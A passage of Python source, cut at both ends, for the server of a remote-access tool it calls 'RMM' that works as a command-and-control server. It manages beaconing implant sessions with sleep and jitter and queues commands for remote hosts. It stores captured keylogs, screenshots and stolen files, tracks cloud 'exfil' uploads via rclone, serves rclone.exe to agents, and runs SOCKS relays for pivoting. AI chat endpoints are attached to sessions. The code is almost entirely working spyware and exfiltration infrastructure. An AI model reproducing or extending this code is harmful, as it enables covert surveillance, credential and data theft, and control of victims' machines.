                with open(meta_path, "r", encoding="utf-8") as f:
                    meta = json.load(f)
            except (OSError, json.JSONDecodeError):
                continue
            if not isinstance(meta, dict):
                continue
            meta["session_id"] = sid
            meta["active"] = sid in active_ids and not meta.get("ended_at")
            rows.append(meta)
        rows.sort(
            key=lambda r: r.get("ended_at") or r.get("updated_at") or r.get("last_seen") or "",
            reverse=True,
        )
        return rows

    def get_history_events(self, session_id_or_prefix, since_id: int = 0, limit: int = 500):
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return None, None
        events_path = self._history_events_path(session_id)
        if not os.path.isfile(events_path):
            live = self.get_session(session_id)
            if live:
                with self.session_lock:
                    events = [e for e in live.result_events if e["id"] > since_id]
                if limit > 0:
                    events = events[-limit:]
                return session_id, events
            return session_id, []
        events = []
        try:
            with open(events_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        ev = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    if isinstance(ev, dict) and ev.get("id", 0) > since_id:
                        events.append(ev)
        except OSError:
            return session_id, None
        if limit > 0:
            events = events[-limit:]
        return session_id, events

    def get_history_meta(self, session_id_or_prefix):
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return None
        meta_path = self._history_meta_path(session_id)
        if not os.path.isfile(meta_path):
            live = self.get_session(session_id)
            if live:
                meta = live.to_dict()
                meta["session_id"] = session_id
                meta["active"] = True
                return meta
            return None
        try:
            with open(meta_path, "r", encoding="utf-8") as f:
                meta = json.load(f)
        except (OSError, json.JSONDecodeError):
            return None
        if isinstance(meta, dict):
            meta["session_id"] = session_id
            meta["active"] = session_id in self.sessions and not meta.get("ended_at")
        return meta

    def purge_session_artifacts(self, session_id: str) -> dict[str, int]:
        """Remove downloads, screenshots, keylogs, and .part staging files for a session."""
        sid = validate_beacon_session_id(session_id)
        counts = {"downloads": 0, "screenshots": 0, "keylogs": 0, "staging": 0}
        if not sid:
            return counts
        prefix = safe_session_storage_prefix(sid)
        pattern_prefix = f"{prefix}_"
        for subdir in ("downloads", "screenshots", "keylogs"):
            dir_path = os.path.join(LOG_DIR, subdir)
            if not os.path.isdir(dir_path):
                continue
            try:
                names = os.listdir(dir_path)
            except OSError:
                continue
            for name in names:
                if not name.startswith(pattern_prefix):
                    continue
                try:
                    path = safe_join_under(dir_path, name)
                except ValueError:
                    continue
                if not os.path.isfile(path):
                    continue
                try:
                    os.remove(path)
                except OSError as e:
                    self.log(f"Artifact delete failed {name}: {e}", "WARNING")
                    continue
                if subdir == "downloads" and name.endswith(".part"):
                    counts["staging"] += 1
                else:
                    counts[subdir] += 1
        with self.session_lock:
            live = self.sessions.get(sid)
            if live:
                live.download_artifacts = []
                live.pending_downloads.clear()
        return counts

    def delete_history_session(
        self, session_id_or_prefix: str
    ) -> tuple[bool, str | None, str | None, dict[str, int] | None]:
        """Remove an archived transcript directory from disk.

        Returns (ok, session_id, error_code, artifacts_purged). error_code is set when ok is False
        (e.g. session_still_active, history_not_found).
        """
        session_id = self.resolve_history_session_id(session_id_or_prefix)
        if not session_id:
            return False, None, "history_not_found", None
        meta = self.get_history_meta(session_id)
        if not meta:
            return False, None, "history_not_found", None
        if meta.get("active"):
            return False, None, "session_still_active", None
        try:
            session_dir = _history_session_dir(session_id)
        except ValueError:
            return False, None, "history_not_found", None
        if not os.path.isdir(session_dir):
            return False, None, "history_not_found", None
        artifacts = self.purge_session_artifacts(session_id)
        try:
            shutil.rmtree(session_dir)
        except OSError as e:
            self.log(f"History delete failed for {session_id[:8]}: {e}", "WARNING")
            return False, None, "delete_failed", None
        self.remove_persisted_session(session_id)
        total = sum(artifacts.values())
        if total:
            self.log(
                f"Purged {total} artifact file(s) for session {session_id[:8]}: {artifacts}",
                "INFO",
            )
        return True, session_id, None, artifacts

    def clear_session_history(self) -> tuple[int, list[dict]]:
        """Delete all ended (non-active) archived sessions from disk."""
        to_delete: list[str] = []
        for meta in self.list_session_history():
            if meta.get("active"):
                continue
            sid = meta.get("session_id")
            if sid:
                to_delete.append(sid)
        deleted = 0
        errors: list[dict] = []
        for sid in to_delete:
            ok, session_id, err, _artifacts = self.delete_history_session(sid)
            if ok:
                deleted += 1
            else:
                errors.append({"session_id": session_id or sid, "error": err or "delete_failed"})
        return deleted, errors

    @staticmethod
    def _artifact_public_url(filepath):
        if not filepath:
            return None
        real = os.path.realpath(filepath)
        for kind in ("downloads", "screenshots"):
            base = os.path.realpath(os.path.join(LOG_DIR, kind))
            if real == base or real.startswith(base + os.sep):
                return f"{API_PREFIX}/artifacts/{kind}/{os.path.basename(real)}"
        return None

    def record_operator_action(self, session, command: str, action: str = "queued"):
        """Log operator commands for shared history (web UI, rmm_cli, API)."""
        if not session or not command:
            return
        self._record_event(session, "operator", f"{action}: {command}", command=command)

    def _broadcast_ephemeral_event(self, session_id: str, ev: dict) -> None:
        """WebSocket-only event (not stored in transcript or session history)."""
        ws_ev = _event_for_ws(ev)
        threading.Thread(
            target=self.event_hub.broadcast_event,
            args=(session_id, ws_ev),
            daemon=True,
        ).start()

    def _record_event(self, session, event_type, body, command=None, artifact=None):
        artifact_url = self._artifact_public_url(artifact) if artifact else None
        with self.session_lock:
            session._event_seq += 1
            ev = {
                "id": session._event_seq,
                "timestamp": datetime.now().isoformat(),
                "type": event_type,
                "body": body,
                "command": command,
                "artifact": artifact,
                "artifact_url": artifact_url,
            }
            session.result_events.append(ev)
        self._history_append_event(session, ev)
        self._history_write_meta(session)
        ws_ev = _event_for_ws(ev)
        threading.Thread(
            target=self.event_hub.broadcast_event,
            args=(session.id, ws_ev),
            daemon=True,
        ).start()
        with session.wait_lock:
            if session.wait_event is not None:
                session.wait_result = ev
                session.wait_event.set()

    def sessions_to_json(self):
        with self.session_lock:
            return [s.to_dict() for s in self.sessions.values()]

    def _broadcast_sessions_async(self) -> None:
        """Push session list to operator WS clients without blocking beacon handlers."""
        def fire() -> None:
            with self._sessions_broadcast_lock:
                self._sessions_broadcast_timer = None
            sessions = self.sessions_to_json()
            self.event_hub.broadcast_sessions(sessions)

        with self._sessions_broadcast_lock:
            if self._sessions_broadcast_timer is not None:
                self._sessions_broadcast_timer.cancel()
            self._sessions_broadcast_timer = threading.Timer(0.2, fire)
            self._sessions_broadcast_timer.daemon = True
            self._sessions_broadcast_timer.start()

    def kill_session(self, session_id_or_prefix):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return False, "not_found"
        self._finalize_session_history(session, reason="killed")
        self.clear_ai_chat(session.id)
        with self.session_lock:
            self.killed_sessions.add(session.id)
            if session.id in self.sessions:
                del self.sessions[session.id]
            if self.current_session == session.id:
                self.current_session = None
        self.remove_persisted_session(session.id)
        self.event_hub.broadcast_sessions(self.sessions_to_json())
        self.socks.stop(session.id)
        return True, session.id

    def start_socks(self, session_id: str, port: int = DEFAULT_SOCKS_PORT, bind_host: str = DEFAULT_BIND_HOST) -> bool:
        session = self.get_session(session_id)
        if not session:
            return False
        try:
            self.socks.start(session_id, port=port, bind_host=bind_host)
        except OSError as e:
            self.log(f"SOCKS failed to bind {bind_host}:{port}: {e}", "ERROR")
            return False
        self.record_operator_action(session, f"socks {port}", "socks")
        self._record_event(
            session,
            "output",
            f"SOCKS5 listening on {bind_host}:{port} (socks5://{bind_host}:{port})",
            command=f"socks {port}",
        )
        return True

    def stop_socks(self, session_id: str) -> bool:
        stopped = self.socks.stop(session_id)
        session = self.get_session(session_id)
        if session:
            self.record_operator_action(session, "socks stop", "socks")
            if stopped:
                self._record_event(session, "output", "SOCKS relay stopped", command="socks stop")
        return stopped

    def socks_active(self, session_id: str) -> bool:
        return self.socks.get(session_id) is not None

    def list_socks_status(self) -> list[dict]:
        """All active SOCKS relays with session hostname/username when known."""
        rows = []
        for relay in self.socks.list_relays():
            row = dict(relay)
            session = self.get_session(relay["session_id"])
            if session:
                row["hostname"] = session.hostname
                row["username"] = session.username
                row["beacon_status"] = session.beacon_status()
            else:
                row["hostname"] = None
                row["username"] = None
                row["beacon_status"] = None
            rows.append(row)
        return rows

    def exec_and_wait(self, session_id_or_prefix, command, timeout=120):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None, "not_found"
        event = threading.Event()
        with session.wait_lock:
            session.wait_event = event
            session.wait_result = None
        if not self.set_command(session.id, command, "oneshot"):
            with session.wait_lock:
                session.wait_event = None
            return None, "not_found"
        if not event.wait(timeout):
            with session.wait_lock:
                session.wait_event = None
            return None, "timeout"
        with session.wait_lock:
            result = session.wait_result
            session.wait_event = None
            session.wait_result = None
        return result, "ok"

    def get_events(self, session_id_or_prefix, since_id=0, limit=50):
        session = self.resolve_session(session_id_or_prefix)
        if not session:
            return None
        with self.session_lock:
            events = [e for e in session.result_events if e["id"] > since_id]
        if limit > 0:
            events = events[-limit:]
        return events
    
    def register_session(
        self,
        session_id,
        hostname,
        username,
        ip=None,
        sleep_seconds=None,
        jitter_percent=None,
        sync_client_config=False,
    ):
        to_save = None
        is_new = False
        with self.session_lock:
            if session_id in self.killed_sessions:
                return None
            persisted = self._persisted_session_configs.get(session_id)
            if not persisted:
                persisted = self._persisted_config_from_history_meta(session_id)
            if session_id not in self.sessions:
                session = Session(session_id, hostname, username, ip)
                if persisted:
                    session.sleep_seconds = persisted["sleep_seconds"]
                    session.jitter_percent = persisted["jitter_percent"]
                    session.config_synced = True
                elif sync_client_config:
                    if sleep_seconds is not None:
                        session.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
                    if jitter_percent is not None:
                        session.jitter_percent = max(0, min(100, int(jitter_percent)))
                    session.config_synced = True
                self.sessions[session_id] = session
                to_save = session
                is_new = True
            else:
                s = self.sessions[session_id]
                s.last_seen = datetime.now()
                s.hostname = hostname
                s.username = username
                if ip is not None:
                    s.ip = ip
                if sync_client_config and not persisted and not s.config_synced:
                    if sleep_seconds is not None:
                        s.sleep_seconds = max(1, min(3600, int(sleep_seconds)))
                    if jitter_percent is not None:
                        s.jitter_percent = max(0, min(100, int(jitter_percent)))
                    s.config_synced = True
                    to_save = s
                else:
                    to_save = None
        if is_new and to_save is not None:
            self.backfill_download_artifacts(to_save)
            self._apply_history_meta_to_session(to_save)
            restored = self._rehydrate_session_events_from_history(to_save)
            if restored:
                self.log(
                    f"Restored {restored} event(s) from history for {to_save.id[:8]}",
                    "INFO",
                )
            self._history_write_meta(to_save)
        if to_save is not None:
            self.save_session(to_save)
        if is_new:
            self.log(f"New session: {to_save}", "SUCCESS")
        self._broadcast_sessions_async()
        return is_new
    
    def update_session_config(self, session_id, sleep_seconds=None, jitter_percent=None):
        session = self.get_session(session_id)
        if session:
            with self.session_lock:
                if sleep_seconds is not None:
                    session.sleep_seconds = max(1, min(3600, sleep_seconds))
                if jitter_percent is not None:
                    session.jitter_percent = max(0, min(100, jitter_percent))
                session.config_synced = True
                session.config_pending = True
            self.save_session(session)
            return True
        return False
    
    def list_sessions(self):
        with self.session_lock:
            if not self.sessions:
                self.tty_print(f"{Colors.YELLOW}No active sessions{Colors.END}")
                return

            self.tty_print(f"\n{Colors.BOLD}Active Sessions:{Colors.END}")
            self.tty_print(
                f"{'ID':<10} {'User':<15} {'Hostname':<20} {'Sleep':<8} {'Jitter':<8} "
                f"{'Last seen':<12} {'Status':<8}",
                ansi=False,
            )
            self.tty_print("-" * 95, ansi=False)
            for sid, session in self.sessions.items():
                ago = int((datetime.now() - session.last_seen).total_seconds())
                status = session.beacon_status()
                self.tty_print(
                    f"{sid[:8]:<10} {session.username:<15} {session.hostname:<20} "
                    f"{session.sleep_seconds:<8} {session.jitter_percent:<8}% "
                    f"{self._format_ago(ago):<12} {status:<8}",
                    ansi=False,
                )
            self.tty_print("", ansi=False)
    
    def set_command(self, session_id, command, cmd_type="oneshot"):
        session = self.get_session(session_id)
        if not session:
            return False
        with self.session_lock:
            if command == "__STOP__":
                session.persistent_cmd = None
                return True
            if cmd_type == "persistent":
                session.cmd_queue.clear()
                session.persistent_cmd = command
                return True
            session.cmd_queue.append(command)
        return True
    
    def get_command(self, session_id):
        """Return (command_string, response_type) for JSON /cmd responses.
        response_type: none | config | execute | persistent
        One-shot commands are queued (FIFO). Persistent runs until __STOP__.
        """
        with self.session_lock:
            if session_id in self.killed_sessions:
                return ("__EXIT__", "execute")
        session = self.get_session(session_id)
        if not session:
            return ("", "none")
        self.touch_session(session_id)
        with self.session_lock:
            if session.persistent_cmd is not None:
                return (session.persistent_cmd, "persistent")
            if session.cmd_queue:
                cmd = session.cmd_queue.popleft()
                return (cmd, "execute")
            if session.config_pending:
                session.config_pending = False
                config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
                return (config_cmd, "config")
            if not session.config_synced:
                return ("", "none")
            config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
            return (config_cmd, "config")

    @staticmethod
    def _unwrap_rmm_result_text(body: str) -> tuple:
        """If client sent JSON {rmm_cmd, rmm_output}, return (text, cmd_echo); else (body, None)."""
        if not body or not body.lstrip().startswith("{"):
            return (body, None)
        try:
            d = json.loads(body)
        except json.JSONDecodeError:
            return (body, None)
        if isinstance(d, dict) and "rmm_output" in d:
            out = d.get("rmm_output", "")
            if out is None:
                out = ""
            elif not isinstance(out, str):
                out = str(out)
            cmd_echo = d.get("rmm_cmd")
            if cmd_echo is not None and not isinstance(cmd_echo, str):
                cmd_echo = str(cmd_echo)
            return (out, cmd_echo)
        return (body, None)

    def _save_file_upload(self, session, data: dict, timestamp: str) -> str | None:
        """Write agent file_upload payload. Returns final path when complete, else None (chunk)."""
        raw_name = data.get("filename", f"unknown_{timestamp}")
        filename = safe_storage_filename(raw_name, f"unknown_{timestamp}")
        downloads_dir = os.path.join(LOG_DIR, "downloads")
        prefix = safe_session_storage_prefix(session.id)
        final_path = safe_join_under(downloads_dir, f"{prefix}_{filename}")
        content = base64.b64decode(data.get("content", "") or "")

        if "offset" not in data:
            with open(final_path, "wb") as f:
                f.write(content)
            return final_path

        upload_id = re.sub(r"[^\w-]", "", str(data.get("upload_id") or "default"))[:64] or "default"
        staging_path = safe_join_under(downloads_dir, f"{prefix}_{upload_id}.part")
        offset = int(data.get("offset", 0))
        mode = "wb" if offset == 0 else "ab"
        with open(staging_path, mode) as f:
            f.write(content)
        if not data.get("eof"):
            return None
        os.replace(staging_path, final_path)
        return final_path

    def handle_result(self, session_id, result, cmd_type="output"):
        session = self.get_session(session_id)
        if not session:
            return
        self.touch_session(session_id)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        tty_lines = []
        artifact = None
        event_body = result
        echoed_cmd = None

        if cmd_type == "file_upload":
            try:
                data = json.loads(result)
                filepath = self._save_file_upload(session, data, timestamp)
                if not filepath:
                    return
                remote_path = (data.get("remote_path") or "").strip()
                if not remote_path:
                    remote_path = self.pop_pending_download_path(
                        session, data.get("filename", "")
                    )
                self.register_download_artifact(session, filepath, remote_path)
                artifact = filepath
                event_body = f"{remote_path} → {os.path.basename(filepath)}"
                echoed_cmd = f"download {remote_path}"
                tty_lines.append(("log", f"File downloaded: {remote_path}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Download error: {e}", "ERROR"))

        elif cmd_type == "screenshot":
            try:
                content = base64.b64decode(result)
                filepath = safe_join_under(
                    LOG_DIR,
                    "screenshots",
                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.png",
                )
                with open(filepath, 'wb') as f:
                    f.write(content)
                artifact = filepath
                event_body = filepath
                echoed_cmd = "screenshot"
                tty_lines.append(("log", f"Screenshot saved: {filepath}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Screenshot error: {e}", "ERROR"))

        elif cmd_type == "keylog":
            try:
                filepath = safe_join_under(
                    LOG_DIR,
                    "keylogs",
                    f"{safe_session_storage_prefix(session.id)}_{timestamp}.log",
                )
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(result)
                artifact = filepath
                event_body = result[:2000] if len(result) > 2000 else result
                tty_lines.append(("log", f"Keylog saved: {filepath}", "SUCCESS"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Keylog save error: {e}", "ERROR"))

        elif cmd_type == "config_ack":
            event_body = result
            tty_lines.append(("log", f"Session {session.id[:8]} acknowledged config update", "SUCCESS"))

        elif cmd_type == "cloud_upload":
            try:
                data = json.loads(result)
                remote_path = (data.get("remote_path") or "").strip()
                profile = (data.get("profile") or "").strip()
                echoed_cmd = f"exfil {remote_path}" + (f" --profile {profile}" if profile else "")
                if data.get("success"):
                    link = (data.get("link") or "").strip()
                    dest = (data.get("dest") or "").strip()
                    backend = (data.get("backend") or "").strip()
                    label = backend or profile or "cloud"
                    if link:
                        event_body = f"{remote_path} → {link}"
                    elif dest:
                        event_body = f"{remote_path} → {label}:{dest}"
                    else:
                        event_body = remote_path
                    tty_lines.append(("log", f"Exfil ({label}): {link or dest or remote_path}", "SUCCESS"))
                else:
                    err = data.get("error") or "Exfil failed"
                    event_body = f"{remote_path}: {err}" if remote_path else str(err)
                    tty_lines.append(("log", f"Exfil failed: {err}", "ERROR"))
            except Exception as e:
                event_body = str(e)
                tty_lines.append(("log", f"Exfil result error: {e}", "ERROR"))

        elif cmd_type in ("exfil_progress", "download_progress"):
            try:
                data = json.loads(result)
                remote_path = (data.get("remote_path") or "").strip()
                if cmd_type == "exfil_progress":
                    profile = (data.get("profile") or "").strip()
                    echoed_cmd = f"exfil {remote_path}" + (f" --profile {profile}" if profile else "")
                else:
                    echoed_cmd = f"download {remote_path}" if remote_path else None
                self._broadcast_ephemeral_event(
                    session.id,
                    {
                        "timestamp": datetime.now().isoformat(),
                        "type": cmd_type,
                        "body": json.dumps(data, ensure_ascii=False),
                        "command": echoed_cmd,
                        "artifact": None,
                        "artifact_url": None,
                    },
                )
            except Exception as e:
                self.log(f"{cmd_type} error: {e}", "WARNING")
            return

        else:
            text, echoed_cmd = self._unwrap_rmm_result_text(result)
            event_body = text
            line = f"\n{Colors.DIM}[Result from {session}]"
            if echoed_cmd:
                line += f" » {echoed_cmd}"
            line += f"{Colors.END}"
            tty_lines.append(("result", line, text))

        self._record_event(session, cmd_type, event_body, command=echoed_cmd, artifact=artifact)

        with self.tty_lock:
            for kind, *rest in tty_lines:
                if kind == "log":
                    self.log(rest[0], rest[1])
                elif kind == "result":
                    self.tty_print(rest[0])
                    self.tty_print(rest[1], ansi=False)
                    self.tty_print(f"{Colors.DIM}{'='*60}{Colors.END}")
            sys.stdout.flush()
            if not self._cli_use_ptk:
                try:
                    readline.redisplay()
                except Exception:
                    pass

class RMMHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass

    def handle(self):
        """Suppress BrokenPipe when clients close before reading the response."""
        try:
            super().handle()
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _safe_write(self, data: bytes) -> None:
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass
    
    def _respond(self, code, body="", content_type="text/plain"):
        try:
            payload = body.encode() if isinstance(body, str) else body
            if payload is None:
                payload = b""
            self.send_response(code)
            self.send_header("Content-Type", content_type)
            # Do NOT send Content-Length here.  With a TLS tunnel (e.g. Cloudflare),
            # the server sends a TLS close_notify alert after the FIN.  If the client
            # has already stopped reading at exactly Content-Length bytes, those alert
            # bytes sit in the TCP receive buffer.  Socket.Close() with unread receive-
            # buffer data sends RST instead of FIN.  Without Content-Length the client's
            # ReadToEnd() reads until TLS EOF (the close_notify IS the EOF signal), the
            # buffer is empty, and the client closes gracefully with FIN.
            self.send_header("Connection", "close")
            self.end_headers()
            if payload:
                self._safe_write(payload)
            self.close_connection = True
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _json(self, code, payload):
        self._respond(code, json.dumps(payload), "application/json")

    def _read_body_bytes(self):
        length = int(self.headers.get("Content-Length", 0))
        if length > MAX_BODY_BYTES:
            raise ValueError("body_too_large")
        if length <= 0:
            return b""
        return self.rfile.read(length)

    def _read_json_body(self):
        raw = self._read_body_bytes().decode(errors="replace")
        if not raw.strip():
            return {}
        return json.loads(raw)

    def _api_token_from_request(self, qs=None):
        auth = self.headers.get("Authorization", "")
        if auth.startswith("Bearer "):
            return auth[7:].strip()
        header = self.headers.get("X-RMM-Token", "").strip()
        if header:
            return header
        if qs:
            return qs.get("token", [""])[0].strip()
        return ""

    def _api_authorized(self, qs=None):
        if INSECURE and not API_TOKEN:
            return True
        if not API_TOKEN:
            return False
        return secure_compare(self._api_token_from_request(qs), API_TOKEN)

    def _api_unauthorized(self):
        self._json(401, {"error": "unauthorized", "detail": "Valid RMM_API_TOKEN required (Bearer or X-RMM-Token)"})

    def _handle_websocket_upgrade(self, qs):
        if self.headers.get("Upgrade", "").lower() != "websocket":
            self._respond(400, "Expected WebSocket upgrade")
            return True
        if not self._api_authorized(qs):
            self._respond(401, "Unauthorized")
            return True

        ws = WebSocketConnection.from_http_request(
            self.connection,
            {k: self.headers[k] for k in self.headers},
            self.path,
        )
        if not ws:
            self._respond(400, "WebSocket handshake failed")
            return True

        session_filter = qs.get("session", [None])[0]
        hub = self.server_instance.event_hub
        hub.add(ws, session_filter)
        self.close_connection = False

        try:
            sessions = self.server_instance.sessions_to_json()
            ws.send_json({"op": "sessions", "sessions": sessions})
            while self.server_instance.running and not ws.closed:
                msg = ws.recv_json()
                if msg is None:
                    break
                if msg.get("op") == "_timeout":
                    ws.send_json({"op": "ping"})
                    continue
                if msg.get("op") == "subscribe":
                    hub.set_filter(ws, msg.get("session_id"))
                    ws.send_json({"op": "subscribed", "session_id": msg.get("session_id")})
        finally:
            hub.remove(ws)
            ws.close()
        return True

    def _handle_socks_agent_websocket(self, session_id: str) -> bool:
        """Agent SOCKS relay channel (beacon auth). Main /cmd beacon stays HTTP."""
        ws = WebSocketConnection.from_http_request(
            self.connection,
            self.headers,
            self.path,
        )
        if not ws:
            self._respond(
                400,
                "WebSocket handshake failed (need Sec-WebSocket-Key and Version 13)",
            )
            return True
        self.server_instance.touch_session(session_id)
        if not self.server_instance.socks.attach_agent_ws(session_id, ws):
            try:
                ws.send_json({"op": "active", "active": False})
            except Exception:
                pass
            ws.close()
            return True
        self.close_connection = False
        try:
            while self.server_instance.running and not ws.closed:
                msg = ws.recv_json()
                if msg is None:
                    break
                if msg.get("op") == "_timeout":
                    continue
                if msg.get("op") == "ping":
                    self.server_instance.touch_session(session_id)
                    ws.send_json({"op": "pong"})
                    continue
                if msg.get("op") == "pull":
                    self.server_instance.touch_session(session_id)
                    tasks = self.server_instance.socks.pull_tasks_for_ws(session_id)
                    ws.send_json({"op": "tasks", "tasks": tasks})
                    continue
                if msg.get("op") == "responses":
                    responses = msg.get("responses")
                    if isinstance(responses, list):
                        self.server_instance.socks.submit_agent_responses(
                            session_id, responses
                        )
                    continue
        finally:
            self.server_instance.socks.detach_agent_ws(session_id, ws)
            ws.close()
        return True

    def _serve_artifact(self, kind: str, filename: str, qs=None):
        if kind not in ("downloads", "screenshots"):
            self._json(404, {"error": "not_found"})
            return True
        safe = safe_storage_filename(filename, "")
        if not safe:
            self._json(400, {"error": "invalid_filename"})
            return True
        try:
            path = safe_join_under(os.path.join(LOG_DIR, kind), safe)
        except ValueError:
            self._json(403, {"error": "forbidden"})
            return True
        if not os.path.isfile(path):
            self._json(404, {"error": "not_found"})
            return True
        mime = "image/png" if kind == "screenshots" else "application/octet-stream"
        download_name = safe
        if qs:
            as_name = (qs.get("as", [""])[0] or "").strip()
            if as_name:
                download_name = safe_storage_filename(as_name, safe)
        with open(path, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", mime)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{download_name}"')
        self.end_headers()
        self._safe_write(data)
        return True

    def _beacon_token_from_request(self, qs):
        header = self.headers.get("X-RMM-Beacon-Token", "").strip()
        if header:
            return header
        return qs.get("beacon_token", [""])[0].strip()

    @staticmethod
    def _beacon_session_id_from_qs(qs) -> tuple[str | None, str | None]:
        """Return (error_message, session_id). error_message is set when id is missing or invalid."""
        raw = qs.get("id", [None])[0]
        if raw is None or not str(raw).strip():
            return "Missing session ID", None
        session_id = validate_beacon_session_id(str(raw))
        if not session_id:
            return "INVALID SESSION ID", None
        return None, session_id

    def _beacon_authorized(self, qs):
        if INSECURE and not BEACON_SECRET:
            return True
        if not BEACON_SECRET:
            return False
        return secure_compare(self._beacon_token_from_request(qs), BEACON_SECRET)

    def _beacon_forbidden(self):
        self._respond(403, "FORBIDDEN")

    def _serve_rclone_tool(self) -> bool:
        """Beacon-authenticated download of rclone.exe for agent bootstrap."""
        if not rclone_binary_available():
            self._respond(404, "rclone binary not configured on server")
            return True
        with open(RCLONE_BIN_PATH, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition", 'attachment; filename="rclone.exe"')
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self._safe_write(data)
        return True

    def _serve_web(self, path: str) -> bool:
        """Serve static files from WEB_DIR under /ui/ (and redirect / → /ui/)."""
        if path in ("", "/"):
            self.send_response(302)
            self.send_header("Location", "/ui/")
            self.end_headers()
            return True

        if not path.startswith("/ui"):
            return False

        rel = path[len("/ui") :].lstrip("/") or "index.html"
        if ".." in rel or rel.startswith(("/", "\\")):
            self._respond(403, "Forbidden")
            return True

        filepath = os.path.realpath(os.path.join(WEB_DIR, rel))
        web_root = os.path.realpath(WEB_DIR)
        if filepath != web_root and not filepath.startswith(web_root + os.sep):
            self._respond(403, "Forbidden")
            return True
        if not os.path.isfile(filepath):
            self._respond(404, "Not Found")
            return True

        ext = os.path.splitext(filepath)[1].lower()
        with open(filepath, "rb") as f:
            data = f.read()
        self.send_response(200)
        self.send_header("Content-Type", WEB_MIME.get(ext, "application/octet-stream"))
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self._safe_write(data)
        return True

    def _api_path_parts(self, path):
        if not path.startswith(API_PREFIX + "/"):
            return None
        rest = path[len(API_PREFIX) + 1 :]
        return [p for p in rest.split("/") if p]

    def _handle_api_get(self, path, qs):
        if not self._api_authorized(qs):
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if parts == ["rclone", "config"]:
            self._json(200, rclone_public_config())
            return True

        if parts == ["health"]:
            self._json(200, {"status": "ok", "sessions": len(srv.sessions)})
            return True

        if parts == ["agent", "script"]:
            script_path = os.path.realpath(CLIENT_SCRIPT)
            repo_root = os.path.realpath(os.path.dirname(os.path.abspath(__file__)))
            if not script_path.startswith(repo_root + os.sep):
                self._json(500, {"error": "invalid_script_path"})
                return True
            if not os.path.isfile(script_path):
                self._json(404, {"error": "script_not_found"})
                return True
            with open(script_path, "r", encoding="utf-8") as f:
                content = f.read()
            self._json(200, {"filename": "client_rmm.ps1", "content": content})
            return True

        if parts == ["sessions"]:
            self._json(200, {"sessions": srv.sessions_to_json()})
            return True

        if parts == ["socks"]:
            relays = srv.list_socks_status()
            self._json(200, {"count": len(relays), "relays": relays})
            return True

        if len(parts) == 2 and parts[0] == "sessions":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session": session.to_dict()})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "events":
            since_id = int(qs.get("since", ["0"])[0] or 0)
            limit = int(qs.get("limit", ["50"])[0] or 50)
            events = srv.get_events(parts[1], since_id=since_id, limit=limit)
            if events is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"events": events})
            return True

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "downloads":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            downloads = srv.list_session_downloads(session.id)
            self._json(
                200,
                {"session_id": session.id, "downloads": downloads or []},
            )
            return True

        if len(parts) == 4 and parts[0] == "sessions" and parts[2] == "ai" and parts[3] == "chat":
            session_id, messages = srv.get_ai_chat(parts[1])
            if session_id is None or messages is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(
                200,
                {"session_id": session_id, "messages": messages, "count": len(messages)},
            )
            return True

        if parts == ["ai", "skills"]:
            from rmm_ai_skills import ai_skills_dir, list_ai_skills

            skills = list_ai_skills()
            self._json(200, {"skills": skills, "count": len(skills), "directory": ai_skills_dir()})
            return True

        if parts == ["history"]:
            rows = srv.list_session_history()
            ended = [r for r in rows if not r.get("active")]
            self._json(200, {"sessions": ended, "count": len(ended)})
            return True

        if len(parts) == 2 and parts[0] == "history":
            meta = srv.get_history_meta(parts[1])
            if not meta:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session": meta})
            return True

        if len(parts) == 3 and parts[0] == "history" and parts[2] == "events":
            since_id = int(qs.get("since", ["0"])[0] or 0)
            limit = int(qs.get("limit", ["500"])[0] or 500)
            session_id, events = srv.get_history_events(parts[1], since_id=since_id, limit=limit)
            if session_id is None or events is None:
                self._json(404, {"error": "session_not_found"})
                return True
            self._json(200, {"session_id": session_id, "events": events})
            return True

        if len(parts) == 3 and parts[0] == "artifacts":
            return self._serve_artifact(parts[1], parts[2], qs)

        self._json(404, {"error": "not_found"})
        return True

    def _handle_api_post(self, path, body):
        if not self._api_authorized():
            self._api_unauthorized()
            return True
        parts = self._api_path_parts(path)
        if parts is None:
            return False
        srv = self.server_instance

        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "commands":
            session = srv.resolve_session(parts[1])
            if not session:
                self._json(404, {"error": "session_not_found"})
                return True
            command = body.get("command", "")
            cmd_type = body.get("type", "oneshot")
            if cmd_type not in ("oneshot", "persistent"):
